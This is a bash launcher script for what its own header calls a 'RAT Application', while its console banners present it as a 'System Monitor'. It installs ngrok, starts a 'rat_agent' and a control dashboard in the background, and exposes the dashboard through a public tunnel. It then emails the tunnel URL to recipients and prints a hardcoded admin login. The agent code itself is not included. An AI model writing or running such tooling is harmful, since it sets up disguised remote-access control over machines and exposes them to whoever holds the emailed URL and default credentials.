#!/bin/bash

################################################################################
# RAT Application - Start with Ngrok Public URL
# Creates a public tunnel to access the dashboard from anywhere
################################################################################

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

print_info() { echo -e "${BLUE}[INFO]${NC} $1"; }
print_success() { echo -e "${GREEN}[SUCCESS]${NC} $1"; }
print_warning() { echo -e "${YELLOW}[WARNING]${NC} $1"; }

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

echo "================================================================================"
echo "              System Monitor - Start with Ngrok Public URL"
echo "================================================================================"
echo ""

# Ngrok path
NGROK_PATH="$HOME/.local/bin/ngrok"
if [ ! -f "$NGROK_PATH" ]; then
    print_warning "Ngrok not found. Installing..."
    cd /tmp
    curl -sL https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz -o ngrok.tgz
    tar -xzf ngrok.tgz
    mkdir -p "$HOME/.local/bin"
    mv ngrok "$HOME/.local/bin/"
    NGROK_PATH="$HOME/.local/bin/ngrok"
    cd "$SCRIPT_DIR"
    print_success "Ngrok installed"
fi

# Kill any existing processes
print_info "Stopping existing processes..."
pkill -f "python3.*rat_agent/agent.py" 2>/dev/null || true
pkill -f "python3.*dashboard/app.py" 2>/dev/null || true
pkill -f "ngrok" 2>/dev/null || true
sleep 2

# Start the RAT agent in background
print_info "Starting System Monitor agent..."
nohup python3 rat_agent/agent.py > /tmp/opencode/rat_agent.log 2>&1 &
AGENT_PID=$!
echo "Agent PID: $AGENT_PID"

# Start the dashboard in background
print_info "Starting dashboard..."
cd dashboard
nohup python3 app.py > /tmp/opencode/rat_dashboard.log 2>&1 &
DASHBOARD_PID=$!
echo "Dashboard PID: $DASHBOARD_PID"
cd ..

# Wait for dashboard to start
print_info "Waiting for dashboard to start..."
sleep 5

# Check if dashboard is running
if curl -s http://127.0.0.1:5000/login > /dev/null; then
    print_success "Dashboard is running"
else
    print_warning "Dashboard may not have started properly"
    echo "Check logs: cat /tmp/opencode/rat_dashboard.log"
fi

# Start ngrok tunnel in background
print_info "Starting ngrok tunnel..."
nohup $NGROK_PATH http 5000 > /tmp/opencode/ngrok.log 2>&1 &
NGROK_PID=$!
echo "Ngrok PID: $NGROK_PID"

# Wait for ngrok to establish tunnel
sleep 5

# Get the public URL
PUBLIC_URL=$($NGROK_PATH list 2>/dev/null | grep 5000 | awk '{print $4}' | head -1)

if [ -z "$PUBLIC_URL" ]; then
    # Alternative method to get URL from API
    PUBLIC_URL=$(curl -s http://127.0.0.1:4040/api/tunnels 2>/dev/null | python3 -c "import sys,json; data=json.load(sys.stdin); print(data['tunnels'][0]['public_url'] if data.get('tunnels') else '')" 2>/dev/null || echo "")
fi

if [ -z "$PUBLIC_URL" ]; then
    print_warning "Could not get ngrok URL automatically"
    print_info "Check ngrok output: cat /tmp/opencode/ngrok.log"
    PUBLIC_URL="Check /tmp/opencode/ngrok.log for URL"
else
    print_success "Ngrok Public URL: $PUBLIC_URL"
    
    # Send URL to recipients
    print_info "Sending public URL to recipients..."
    python3 -c "
import sys
sys.path.insert(0, '$SCRIPT_DIR')
from rat_agent.emailer import EmailSender
from rat_agent.config import Config
emailer = EmailSender(Config())
emailer.send_dashboard_url('$PUBLIC_URL')
"
fi

echo ""
echo "================================================================================"
echo "                    System Monitor is Running!"
echo "================================================================================"
echo ""
echo "Public Dashboard URL: $PUBLIC_URL"
echo "Local Dashboard URL:  http://localhost:5000"
echo ""
echo "Login Credentials:"
echo "  Username: admin"
echo "  Password: rat_admin_2024"
echo ""
echo "Process IDs:"
echo "  Agent PID:     $AGENT_PID"
echo "  Dashboard PID: $DASHBOARD_PID"
echo "  Ngrok PID:     $NGROK_PID"
echo ""
echo "Commands:"
echo "  View agent logs:    tail -f /tmp/opencode/rat_agent.log"
echo "  View dashboard logs: tail -f /tmp/opencode/rat_dashboard.log"
echo "  View ngrok logs:    tail -f /tmp/opencode/ngrok.log"
echo "  Stop all:           pkill -f rat && pkill -f ngrok"
echo ""
echo "Ngrok Status:"
$NGROK_PATH list 2>/dev/null || echo "  Check /tmp/opencode/ngrok.log"
echo ""
echo "================================================================================"
